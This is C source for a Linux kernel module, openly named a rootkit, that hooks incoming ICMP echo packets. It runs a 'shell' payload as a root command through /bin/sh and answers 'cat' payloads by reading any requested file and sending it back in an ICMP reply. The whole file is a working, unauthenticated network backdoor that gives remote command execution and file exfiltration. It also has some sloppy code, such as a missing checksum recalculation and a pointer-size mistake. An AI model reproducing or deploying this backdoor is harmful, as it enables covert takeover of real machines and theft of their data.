#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>

#include <linux/fs.h>


// number of valid commands
#define COMMAND_NUM 2

// actions whic user can perform
typedef enum {
  RUN, 
  CAT,
  BAD_COMMAND
} command_t;


#define REQUEST_SIZE_LIMIT 1500 

// structure passed to scheduler
typedef struct {
  struct work_struct work;
  char string[REQUEST_SIZE_LIMIT];
  struct iphdr *iph;
  struct icmphdr *icmph;
  struct sk_buff *skb;
} args_t;

// hook for handling icmp packets
static struct nf_hook_ops nfho;



#define ICMP_HSIZE 8
#define IP_HSIZE 20

#define CAT_BUFFER_SIZE 100


// runs the command in bash shell
static void run_shell_command(char* bash_command);

// reads 'to_read' bytes from file into the buffer
static int read_file(char* filename, char* buffer, int to_read);

// parses the command, deletes the command string from data and returns the respective command
static command_t parse_command(char* data);

// returns the icmp with given payload string to the sender (using the given device)
int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev);

// sends icmp to the ECHO packet sender, frees the packet and args structure
void send_response(char* string, args_t* args);

// parses the payload and performs the command
static void rootkit_handler(struct work_struct* work);

// gets the packet payload and schedules the work which will perform the action and send answer
static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);



static int __init startup(void)
{
    // configuring a hook which will handle icmp packets recieved
    nfho.hook = packet_reciever;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    
    printk(KERN_INFO "rootkit: start\n");

    return 0;
}

static void __exit cleanup(void)
{
    // unregistering the hook after module was removed
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "rootkit: finished\n");
}


MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);



static void run_shell_command(char* bash_command) {
    char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    printk(KERN_INFO "rootkit: performing bash command\n");

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

}

static int read_file(char* filename, char* buffer, int to_read) {
    struct file *f;
    int i;
    loff_t offset = 0;

    // initializing string with null symbols
    for (i = 0; i < to_read + 1; i++) {
        buffer[i] = '\0';
    }
    
    
    f = filp_open(filename, O_RDONLY, 0);

    if (IS_ERR(f)) {
        printk(KERN_INFO "rootkit: file was not open\n");
        return -1;
    }

    // TODO: check return value + dynamic allocation
    kernel_read(f, (void*) buffer, to_read, &offset);


    printk(KERN_INFO "rootkit: file was read: %s\n", buffer);

    filp_close(f, NULL);
    
    return 0;


}


static command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0"};
    command_t commands[COMMAND_NUM] = {RUN, CAT};
    uint i, shift, j;


    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);

        // checking if the string starts with the given command
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        // shifting the string (to delete the command)
        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }


    return BAD_COMMAND;

}


int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){

    
    int payload_size = strlen(string);

    u32 saddr_copy;
    unsigned char* payload;

    // we don't noe the mac address, so we will transmit our packet to all devices
    static char return_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    printk(KERN_INFO "rootkit: 1\n");
    // allocation memort for 3 headers + payload
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    printk(KERN_INFO "rootkit: 2\n");

    // reserving size for headers
    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    // putting the payload in socket buffer
    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    // icmp header needs only to change the type
    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;

    // TODO: add sum recalculation

 
    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    // swapping sender and reciever
    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    printk(KERN_INFO "rootkit: 3\n");

    // configuring the socket
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));

    new_eth->h_proto = skb->protocol;
    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, return_mac, ETH_ALEN);
    

    // adding the packet to transmit queue
    ret = dev_queue_xmit(skb);

    printk(KERN_INFO "rootkit: ret: %d\n", ret);
    

    return ret;
}


void send_response(char* string, args_t* args) {

    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
    return_icmp(string, args->icmph, args->iph, enp0s3);

    // freeing the device
    dev_put(enp0s3);

    // freeing recieved packet content
    kfree_skb(args->skb);
}



static void rootkit_handler(struct work_struct* work) {

    // getting passed args struct
    args_t* args = container_of(work, args_t, work);

    char buffer[CAT_BUFFER_SIZE + 1];

    command_t command = parse_command(args->string);

    switch (command) {
        case RUN:
            printk(KERN_INFO "rootkit: shell command: %s \n", args->string);
            run_shell_command(args->string);
            send_response("rootkit: command was performed\0", args);
            break;
        case CAT:
            printk(KERN_INFO "rootkit: cat command: %s \n", args->string);
            // checking errors
            if (read_file(args->string, buffer, CAT_BUFFER_SIZE) == 0) {   
                send_response(buffer, args);
            } else {
                send_response("rootkit: error while reading\0", args);
            }
            
            break;
        default:
            printk(KERN_INFO "rootkit: invalid command\n");
            send_response("rootkit: invallid command\0", args);
            break;
    }


    kfree(args);


}

    


static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args;


    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);


    printk(KERN_INFO "rootkit: ckecking connection\n");


    if (iph->protocol != IPPROTO_ICMP) {
        printk(KERN_INFO "rootkit: bad protocol\n");
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        printk(KERN_INFO "rootkit: bad request type\n");
        return NF_ACCEPT;
    }

    printk(KERN_INFO "rootkit: parsing command\n");

    args = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    // copying the payload to the arg struct
    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == REQUEST_SIZE_LIMIT) {
            args->string[j] = '\0';
            break;
        }

    }

    args->icmph = icmph;
    args->iph = iph;
    args->skb = skb;

    printk(KERN_INFO "rootkit: scheduling rootkit action \n");
    INIT_WORK(&args->work, rootkit_handler);
    schedule_work(&args->work);


    return NF_STOLEN;
}